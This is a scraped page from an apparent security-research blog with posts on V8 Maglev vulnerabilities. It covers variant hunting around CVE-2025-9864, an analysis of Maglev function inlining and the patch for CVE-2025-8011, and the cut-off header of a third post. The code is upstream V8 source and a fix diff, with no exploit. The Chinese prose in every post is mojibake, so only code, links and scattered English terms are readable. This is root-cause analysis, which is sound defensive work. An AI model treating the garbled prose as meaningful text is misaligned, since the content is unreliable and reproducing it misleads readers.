            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>å¹¾å¤©å‰æˆ‘åœ¨åˆ†æ CVE-2025-9864ï¼Œé€™ç¯‡ä¸»è¦æ˜¯ä¸€äº› murmur å’Œå¿ƒå¾—ï¼Œçœ‹å®Œå¾Œæœ‰æ€è€ƒäº†ä¸€ä¸‹ bug pattern çš„æ¨¡å¼ï¼Œç„¶å¾Œå˜—è©¦æ‰¾ç›¸ä¼¼çš„æ¼æ´<br>è¦ºå¾—å¯èƒ½æœƒæœ‰å…¶ä»–ç”¨éŒ¯ ConversionMode çš„åœ°æ–¹<br>æ‰€ä»¥ç¿»äº†ä¸€ä¸‹ ConversionMode::kForceHeapNumber èˆ‡å…¶ä»–çš„ ConversionMode å˜—è©¦ç†è§£ä»–å€‘çš„ç”¨é€”</p>
<p>source code ä¸­æœ‰æåˆ°<br><code>Float64ToTagged&#39;s conversion mode is used to control whether integer floats should be converted to Smis or to HeapNumbers: kCanonicalizeSmi means that they can be converted to Smis, and otherwise they should remain HeapNumbers.</code><br><a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/turboshaft/turbolev-graph-builder.cc;l=5922?q=kCanonicalizeSmi&ss=chromium/chromium/src:v8/">https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/turboshaft/turbolev-graph-builder.cc;l=5922?q=kCanonicalizeSmi&amp;ss=chromium%2Fchromium%2Fsrc:v8%2F</a></p>
<p>kCanonicalizeSmi æœƒå»çœ‹ç•¶å‰ value èƒ½ä¸èƒ½è¢« smi è¡¨ç¤ºï¼Œå¯ä»¥çš„è©±å°±æœƒç”¢å‡º smi ç›¸é—œçš„ nodeï¼Œå¦å‰‡ç”¨ HeapNumber<br>è€Œ kForceHeapNumber å‰‡ä¸€å¾‹ç”¨ Heap Number<br>CVE-2025-9864 çš„æˆå› æ˜¯æ²’æœ‰è€ƒæ…®åˆ°å»ºåœ–æ™‚çš„ç”¨ä¾†çœç•¥ Write Barrier() çš„ä¸€é …æ©Ÿåˆ¶ï¼Œä¸€å¾‹ä½¿ç”¨ kForceHeapNumber ä¾† allocate å‡º Heap Numberï¼Œå°è‡´é‚„åœ¨ä½¿ç”¨ä¸­ã€éœ€è¦ Write Barrier çš„ Heap Number è¢« GC å›æ”¶å½¢æˆ UAF</p>
<p>Write Barrier æ˜¯ä¸€é …ç”¨ä¾†å¹«åŠ© V8 Garbage Collection çš„æ©Ÿåˆ¶ï¼Œç´°ç¯€å¯ä»¥çœ‹å®˜æ–¹æ–‡ä»¶<br><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8.git/+/refs/tags/13.1.147/src/heap/WRITE_BARRIER.md">https://chromium.googlesource.com/v8/v8.git/+/refs/tags/13.1.147/src/heap/WRITE_BARRIER.md</a></p>
<p>çœ‹å®Œå¾Œæƒ³åˆ° kForceHeapNumber æœƒä¸æœƒæœ‰å…¶ä»–å•é¡Œ(e.g. å› ç‚º Maglev æœ‰éå¸¸å¤šçš„ Optimize æ©Ÿåˆ¶ï¼Œé–‹ç™¼è€…å¯èƒ½æœƒæ²’è€ƒæ…®åˆ°é€™äº›æ©Ÿåˆ¶ï¼Œä¸€å¾‹ä½¿ç”¨ kForceHeapNumber å°è‡´ä¸€äº›å¥‡æ€ªçš„å•é¡Œï¼Œä¾‹å¦‚é€™æ¬¡çš„ UAF)<br>æ‰€ä»¥å°±å»ç¿»äº†ä¸€ä¸‹ kForceHeapNumber åœ¨å“ªè£¡è¢«ç”¨åˆ°ï¼Œç™¼ç¾ä»–åœ¨ src&#x2F;maglev&#x2F;maglev-inlining.cc æœ‰è¢«ç”¨åˆ°<br>ç”¨ switch åˆ¤æ–· ValueRepresentation ä¾†æ±ºå®šæ€éº¼æ–°å¢ IR çš„æ–¹å¼è·Ÿ CVE-2025-9864 å‡ºå•é¡Œçš„åœ°æ–¹éå¸¸ç›¸ä¼¼<br>CVE-2025-9864 Patch: <a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/6787941">https://chromium-review.googlesource.com/c/v8/v8/+/6787941</a><br>æˆ‘æ‡·ç–‘é€™å€‹åœ°æ–¹å¯èƒ½æœ‰å•é¡Œæ‰€ä»¥æ‰“ç®—è®€ code åšåˆ†æï¼Œç•¶æ™‚å¤§æ¦‚æ˜¯ 9&#x2F;8 æ™šä¸Š<br>è®€åˆ°ä¸€åŠè¦ºå¾—å¤ªç´¯äº†å»ç¡è¦ºï¼Œé†’ä¾†å¾Œç™¼ç¾ V8 ç™¼äº†ä¸€å€‹ Commit å°é€™å€‹åœ°æ–¹åš Patch</p>
<p>Patch : <a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/6917249">https://chromium-review.googlesource.com/c/v8/v8/+/6917249</a><br>å°æ‡‰åˆ°çš„ Issue æ˜¯ <a target="_blank" rel="noopener" href="https://issues.chromium.org/issues/443476912">https://issues.chromium.org/issues/443476912</a><br>(V8 çš„ commit å¦‚æœæ˜¯åœ¨ä¿®æ¼æ´çš„è©±ï¼ŒCommit Message ä¸­æœƒæœ‰ Bug IDã€‚é›–ç„¶æ²’è¾¦æ³•çœ‹åˆ° Issue ç´°ç¯€ï¼Œä½†å¯ä»¥ç”¨ diff åˆ†ææ¼æ´æˆå› )<br>ç­‰ Issue é–‹å¾Œæƒ³çœ‹ä¸€ä¸‹ä»€éº¼æ™‚å€™å›å ±çš„ï¼Œç–‘ä¼¼å·®é»æ’¿åˆ° V8 çš„æ´ XD</p>
<p>ä»¥å¾Œæœ‰æ´ä¸€å®šç›¡å¿«çœ‹å®Œç„¶å¾Œæ‰¾ Variant XD</p>
<p>å…¶ä»–ç”¨ kForceHeapNumber çš„åœ°æ–¹éƒ½è¢«ä¿®æ‰äº†ï¼Œé€™å€‹ bug Pattern æ‡‰è©²ä¸æœƒå†å‡ºç¾äº†XD</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/09/08/CVE-2025-8011/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Terry1234">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Terry1234's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/09/08/CVE-2025-8011/" class="post-title-link" itemprop="url">Maglev Inlining and CVE-2025-8011</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-09-08 21:28:40 / Modified: 21:54:51" itemprop="dateCreated datePublished" datetime="2025-09-08T21:28:40+08:00">2025-09-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>å‰é™£å­çœ‹åˆ°è·Ÿ Maglev Function Inline æœ‰é—œçš„æ¼æ´ CVE-2025-8011ï¼Œæ‰€ä»¥é †ä¾¿è¿½ä¸€ä¸‹ Maglev æ˜¯æ€éº¼è™•ç† Function Inline çš„</p>
<h2 id="Maglev-Function-Inline"><a href="#Maglev-Function-Inline" class="headerlink" title="Maglev Function Inline"></a>Maglev Function Inline</h2><h3 id="MaglevGraphBuilder-TryBuildInlineCall"><a href="#MaglevGraphBuilder-TryBuildInlineCall" class="headerlink" title="MaglevGraphBuilder::TryBuildInlineCall()"></a>MaglevGraphBuilder::TryBuildInlineCall()</h3><p>[1] -&gt; è¦æœ‰ feedback vector<br>[2] -&gt; çœ‹å¯ä¸å¯ä»¥ Inline<br>[3] -&gt; æ ¹æ“š SharedFunctionInfo &#x2F; CallArgument æ±ºå®šè¦ä¸è¦ç”¨ Eager Inline<br>[4] -&gt; çœ‹èµ·ä¾†è·Ÿ user è‡ªè¨‚çš„é¸é …æœ‰é—œ<br>[5] -&gt; å¦‚æœ Maglev åˆ¤æ–·é€™å€‹ Function ä¸å€¼å¾—é¦¬ä¸Š Inlineï¼ŒæœƒæŠŠå®ƒæ”¾é€² inlineable_call_ è£¡é¢<br>å¾ŒçºŒæœƒç”± MaglevInliner åˆ¤æ–·è¦ä¸è¦åš Inline<br>å¯èƒ½æ˜¯é€™äº›è¼ƒå°ã€å€¼å¾—è¢«å±•é–‹çš„ Function æœ‰åŠ©æ–¼å»ºç«‹ Maglev IR Graph æ™‚çš„å„ªåŒ–</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">MaybeReduceResult <span class="title">MaglevGraphBuilder::TryBuildInlineCall</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    ValueNode* context, ValueNode* function, ValueNode* new_target,</span></span></span><br><span class="line"><span class="params"><span class="function">#ifdef V8_ENABLE_LEAPTIERING</span></span></span><br><span class="line"><span class="params"><span class="function">    JSDispatchHandle dispatch_handle,</span></span></span><br><span class="line"><span class="params"><span class="function">#endif</span></span></span><br><span class="line"><span class="params"><span class="function">    compiler::SharedFunctionInfoRef shared,</span></span></span><br><span class="line"><span class="params"><span class="function">    compiler::FeedbackCellRef feedback_cell, CallArguments&amp; args,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> compiler::FeedbackSource&amp; feedback_source)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(args.<span class="built_in">mode</span>(), CallArguments::kDefault);</span><br><span class="line">  <span class="keyword">if</span> (!feedback_cell.<span class="built_in">feedback_vector</span>(<span class="built_in">broker</span>())) &#123; <span class="comment">// [1]</span></span><br><span class="line">    <span class="comment">// TODO(verwaest): Soft deopt instead?</span></span><br><span class="line">    <span class="built_in">TRACE_CANNOT_INLINE</span>(<span class="string">&quot;it has not been compiled/run with feedback yet&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">float</span> feedback_frequency = <span class="number">0.0f</span>;</span><br><span class="line">  <span class="keyword">if</span> (feedback_source.<span class="built_in">IsValid</span>()) &#123;</span><br><span class="line">    compiler::ProcessedFeedback <span class="type">const</span>&amp; feedback =</span><br><span class="line">        <span class="built_in">broker</span>()-&gt;<span class="built_in">GetFeedbackForCall</span>(feedback_source);</span><br><span class="line">    feedback_frequency =</span><br><span class="line">        feedback.<span class="built_in">IsInsufficient</span>() ? <span class="number">0.0f</span> : feedback.<span class="built_in">AsCall</span>().<span class="built_in">frequency</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">float</span> call_frequency = feedback_frequency * <span class="built_in">GetCurrentCallFrequency</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">CanInlineCall</span>(shared, call_frequency)) <span class="keyword">return</span> &#123;&#125;; <span class="comment">// [2] </span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">ShouldEagerInlineCall</span>(shared, args)) &#123;<span class="comment">// [3]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">BuildEagerInlineCall</span>(context, function, new_target, shared,</span><br><span class="line">                                feedback_cell, args, call_frequency);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Should we inline call?</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">inlining_depth</span>() &gt; <span class="built_in">max_inline_depth</span>()) &#123;</span><br><span class="line">    <span class="built_in">TRACE_CANNOT_INLINE</span>(<span class="string">&quot;inlining depth (&quot;</span> &lt;&lt; <span class="built_in">inlining_depth</span>()</span><br><span class="line">                                           &lt;&lt; <span class="string">&quot;) &gt;= max-depth (&quot;</span></span><br><span class="line">                                           &lt;&lt; <span class="built_in">max_inline_depth</span>() &lt;&lt; <span class="string">&quot;)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  compiler::BytecodeArrayRef bytecode = shared.<span class="built_in">GetBytecodeArray</span>(<span class="built_in">broker</span>());</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">is_non_eager_inlining_enabled</span>()) &#123; <span class="comment">// [4]</span></span><br><span class="line">    <span class="built_in">graph</span>()-&gt;<span class="built_in">add_inlined_bytecode_size</span>(bytecode.<span class="built_in">length</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">BuildEagerInlineCall</span>(context, function, new_target, shared,</span><br><span class="line">                                feedback_cell, args, call_frequency);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">TRACE_INLINING</span>(<span class="string">&quot;  considering &quot;</span> &lt;&lt; shared &lt;&lt; <span class="string">&quot; for inlining&quot;</span>);</span><br><span class="line">  <span class="keyword">auto</span> arguments = <span class="built_in">GetArgumentsAsArrayOfValueNodes</span>(shared, args);</span><br><span class="line">  <span class="keyword">auto</span> generic_call = <span class="built_in">BuildCallKnownJSFunction</span>(context, function, new_target,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> V8_ENABLE_LEAPTIERING</span></span><br><span class="line">                                               dispatch_handle,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                                               shared, arguments);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Note: We point to the generic call exception handler instead of</span></span><br><span class="line">  <span class="comment">// jump_targets_ because the former contains a BasicBlockRef that is</span></span><br><span class="line">  <span class="comment">// guaranteed to be updated correctly upon exception block creation.</span></span><br><span class="line">  <span class="comment">// BuildLoopForPeeling might reset the BasicBlockRef in jump_targets_. If this</span></span><br><span class="line">  <span class="comment">// happens, inlined calls within the peeled loop would incorrectly point to</span></span><br><span class="line">  <span class="comment">// the loop&#x27;s exception handler instead of the original call&#x27;s.</span></span><br><span class="line">  CatchBlockDetails catch_details = <span class="built_in">GetTryCatchBlockForNonEagerInlining</span>(</span><br><span class="line">      generic_call-&gt;<span class="built_in">exception_handler_info</span>());</span><br><span class="line">  catch_details.deopt_frame_distance++;</span><br><span class="line">  <span class="type">float</span> score = call_frequency / bytecode.<span class="built_in">length</span>();</span><br><span class="line">  MaglevCallSiteInfo* call_site = <span class="built_in">zone</span>()-&gt;<span class="built_in">New</span>&lt;MaglevCallSiteInfo&gt;(</span><br><span class="line">      MaglevCallerDetails&#123;</span><br><span class="line">          arguments, &amp;generic_call-&gt;<span class="built_in">lazy_deopt_info</span>()-&gt;<span class="built_in">top_frame</span>(),</span><br><span class="line">          <span class="built_in">known_node_aspects</span>().<span class="built_in">Clone</span>(<span class="built_in">zone</span>()), loop_effects_,</span><br><span class="line">          unobserved_context_slot_stores_, catch_details, <span class="built_in">IsInsideLoop</span>(),</span><br><span class="line">          <span class="comment">/* is_eager_inline */</span> <span class="literal">false</span>, call_frequency&#125;,</span><br><span class="line">      generic_call, feedback_cell, score);</span><br><span class="line">  <span class="built_in">graph</span>()-&gt;<span class="built_in">inlineable_calls</span>().<span class="built_in">push</span>(call_site); <span class="comment">// [5]</span></span><br><span class="line">  <span class="keyword">return</span> generic_call;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ShouldEagerInlineCall"><a href="#ShouldEagerInlineCall" class="headerlink" title="ShouldEagerInlineCall()"></a>ShouldEagerInlineCall()</h3><ol>
<li>çœ‹ bytecode é•·åº¦å¤ ä¸å¤ çŸ­ (len &lt; 27)</li>
<li>å¦‚æœæœ‰é–‹ â€“turbolev çš„è©±çœ‹ len &lt; 75 å’Œä¸€äº› flagï¼Œæ¥è‘—æª¢æŸ¥åƒæ•¸çš„ typeï¼Œå¦‚æœæœ‰çš„è©±å°± return true</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MaglevGraphBuilder::ShouldEagerInlineCall</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    compiler::SharedFunctionInfoRef shared, CallArguments&amp; args)</span> </span>&#123;</span><br><span class="line">  compiler::BytecodeArrayRef bytecode = shared.<span class="built_in">GetBytecodeArray</span>(<span class="built_in">broker</span>());</span><br><span class="line">  <span class="keyword">if</span> (bytecode.<span class="built_in">length</span>() &lt; <span class="built_in">max_inlined_bytecode_size_small</span>()) &#123;<span class="comment">// 27</span></span><br><span class="line">    <span class="built_in">TRACE_INLINING</span>(<span class="string">&quot;  greedy inlining &quot;</span></span><br><span class="line">                   &lt;&lt; shared &lt;&lt; <span class="string">&quot;: small function, skipping max-depth&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// TODO(victorgomes): Evaluate why this is not worth for Maglev, it regresses</span></span><br><span class="line">  <span class="comment">// crypto benchmarks.</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">is_turbolev</span>() &amp;&amp; <span class="built_in">inlining_depth</span>() &lt;= <span class="built_in">max_inline_depth</span>() &amp;&amp;</span><br><span class="line">      bytecode.<span class="built_in">length</span>() &lt;</span><br><span class="line">          <span class="built_in">max_inlined_bytecode_size_small_with_heapnum_in_out</span>() &amp;&amp;</span><br><span class="line">      args.<span class="built_in">mode</span>() == CallArguments::kDefault) &#123;<span class="comment">// 75</span></span><br><span class="line">    <span class="type">bool</span> has_float_arg = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">1</span>; i &lt; args.<span class="built_in">count_with_receiver</span>(); i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (args[i] &amp;&amp;</span><br><span class="line">          (args[i]-&gt;<span class="built_in">value_representation</span>() == ValueRepresentation::kFloat64 ||</span><br><span class="line">           args[i]-&gt;<span class="built_in">value_representation</span>() ==</span><br><span class="line">               ValueRepresentation::kHoleyFloat64)) &#123;</span><br><span class="line">        has_float_arg = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (has_float_arg) &#123;</span><br><span class="line">      <span class="built_in">TRACE_INLINING</span>(<span class="string">&quot;  greedy inlining &quot;</span></span><br><span class="line">                     &lt;&lt; shared &lt;&lt; <span class="string">&quot;: small function with heap number inputs&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="CVE-2025-8011-Infomation"><a href="#CVE-2025-8011-Infomation" class="headerlink" title="CVE-2025-8011 Infomation"></a>CVE-2025-8011 Infomation</h2><p>(CVE-2025-8011)[430572435][maglev]Type Confusion<br><a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/6732846">https://chromium-review.googlesource.com/c/v8/v8/+/6732846</a><br><a target="_blank" rel="noopener" href="https://chromereleases.googleblog.com/2025/07/stable-channel-update-for-desktop_22.html">https://chromereleases.googleblog.com/2025/07/stable-channel-update-for-desktop_22.html</a></p>
<p>Reported by Shaheen Fazim(@shaheenfazim)</p>
<p>Issue ç›®å‰ä¸å…¬é–‹ï¼Œä½†æœ‰ Patch å¯ä»¥çœ‹</p>
<h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">From f22ca7b61a92d3cd2b856485a55a1519cb11b627 Mon Sep 17 00:00:00 2001</span><br><span class="line">From: Toon Verwaest &lt;verwaest@chromium.org&gt;</span><br><span class="line">Date: Mon, 14 Jul 2025 17:01:40 +0200</span><br><span class="line">Subject: [PATCH] [maglev] Cap inlining at MaxInliningId</span><br><span class="line"></span><br><span class="line">Bug: 430572435</span><br><span class="line">Change-Id: I4f20bad6c99e9d3d5a959cb801485dfb117e9884</span><br><span class="line">Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6732846</span><br><span class="line">Commit-Queue: Toon Verwaest &lt;verwaest@chromium.org&gt;</span><br><span class="line">Auto-Submit: Toon Verwaest &lt;verwaest@chromium.org&gt;</span><br><span class="line">Reviewed-by: Olivier FlÃ¼ckiger &lt;olivf@chromium.org&gt;</span><br><span class="line">Cr-Commit-Position: refs/heads/main@&#123;#101423&#125;</span><br><span class="line"><span class="comment">---</span></span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/codegen/source-position.h b/src/codegen/source-position.h</span></span><br><span class="line"><span class="comment">index 85dcd96..3b0ff0e 100644</span></span><br><span class="line"><span class="comment">--- a/src/codegen/source-position.h</span></span><br><span class="line"><span class="comment">+++ b/src/codegen/source-position.h</span></span><br><span class="line"><span class="meta">@@ -116,6 +116,8 @@</span></span><br><span class="line">     value_ = InliningIdField::update(value_, inlining_id + 1);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+  static constexpr int MaxInliningId() &#123; return InliningIdField::kMax; &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">   static const int kNotInlined = -1;</span><br><span class="line">   static_assert(kNoSourcePosition == -1);</span><br><span class="line"> </span><br><span class="line"><span class="comment">diff --git a/src/maglev/maglev-graph-builder.cc b/src/maglev/maglev-graph-builder.cc</span></span><br><span class="line"><span class="comment">index 861d64b..3d5a3a3 100644</span></span><br><span class="line"><span class="comment">--- a/src/maglev/maglev-graph-builder.cc</span></span><br><span class="line"><span class="comment">+++ b/src/maglev/maglev-graph-builder.cc</span></span><br><span class="line"><span class="meta">@@ -8002,6 +8002,13 @@</span></span><br><span class="line"> </span><br><span class="line"> bool MaglevGraphBuilder::CanInlineCall(compiler::SharedFunctionInfoRef shared,</span><br><span class="line">                                        float call_frequency) &#123;</span><br><span class="line"><span class="addition">+  if (static_cast&lt;int&gt;(graph()-&gt;inlined_functions().size()) &gt;=</span></span><br><span class="line"><span class="addition">+      SourcePosition::MaxInliningId()) &#123;</span></span><br><span class="line"><span class="addition">+    compilation_unit_-&gt;info()-&gt;set_could_not_inline_all_candidates();</span></span><br><span class="line"><span class="addition">+    TRACE_CANNOT_INLINE(&quot;maximum inlining ids&quot;);</span></span><br><span class="line"><span class="addition">+    return false;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">   if (graph()-&gt;total_inlined_bytecode_size() &gt;</span><br><span class="line">       max_inlined_bytecode_size_cumulative()) &#123;</span><br><span class="line">     compilation_unit_-&gt;info()-&gt;set_could_not_inline_all_candidates();</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°é€™è£¡æˆ‘æƒ³åˆ° CVE-2024-2887ï¼Œå®ƒæ˜¯ä¸€å€‹ WasmType ID è¶…å‡ºæœ€å¤§å€¼å°è‡´ä½¿ç”¨äº† general Type ä¾†è¡¨ç¤º Wasm Struct çš„ Type Confusion æ¼æ´<br>ä½† Maglev Inline ID æ²’æ‰¾åˆ°é¡ä¼¼çš„æƒ…å¢ƒ<br>æ‰€ä»¥çŒœæ¸¬å¯èƒ½æ˜¯ integer overflow å°è‡´é€™è£¡æ‹¿åˆ°äº†éŒ¯çš„ SharedFunctionInfo<br>ç­‰ Issue æˆ– PoC å…¬é–‹å¾Œæœƒæ‹¿ gdb è¿½ä¸€éï¼Œé †ä¾¿ç ”ç©¶æ€éº¼æ‰“</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::vector&lt;SourcePositionInfo&gt; <span class="title">SourcePosition::InliningStack</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    Isolate* isolate, OptimizedCompilationInfo* cinfo)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">  SourcePosition pos = *<span class="keyword">this</span>;</span><br><span class="line">  std::vector&lt;SourcePositionInfo&gt; stack;</span><br><span class="line">  <span class="keyword">while</span> (pos.<span class="built_in">isInlined</span>()) &#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">auto</span>&amp; inl = cinfo-&gt;<span class="built_in">inlined_functions</span>()[pos.<span class="built_in">InliningId</span>()];</span><br><span class="line">    stack.<span class="built_in">push_back</span>(<span class="built_in">SourcePositionInfo</span>(isolate, pos, inl.shared_info));</span><br><span class="line">    pos = inl.position.position;</span><br><span class="line">  &#125;</span><br><span class="line">  stack.<span class="built_in">push_back</span>(<span class="built_in">SourcePositionInfo</span>(isolate, pos, cinfo-&gt;<span class="built_in">shared_info</span>()));</span><br><span class="line">  <span class="keyword">return</span> stack;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/09/08/Chromium-Issue-410136467-RCA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Terry1234">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Terry1234's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/09/08/Chromium-Issue-410136467-RCA/" class="post-title-link" itemprop="url">Chromium Issue 410136467 RCA</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

